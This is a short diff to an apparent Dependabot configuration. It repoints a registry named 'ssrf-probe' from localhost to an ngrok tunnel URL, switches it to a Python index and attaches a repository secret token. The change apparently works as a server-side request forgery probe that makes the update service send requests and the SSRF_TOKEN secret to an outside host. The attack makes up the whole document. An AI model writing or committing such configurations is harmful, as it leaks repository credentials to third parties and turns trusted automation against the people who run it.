@@ -1,12 +1,11 @@
 version: 2
 registries:
   ssrf-probe:
-    type: npm-registry
-    url: http://127.0.0.1
+    type: python-index
+    url: https://d511-84-30-51-191.ngrok-free.app
     token: ${{ secrets.SSRF_TOKEN }}
-    replaces-base: true
 updates:
-  - package-ecosystem: "npm"
+  - package-ecosystem: "pip"
     directory: "/"
     schedule:
       interval: "daily"
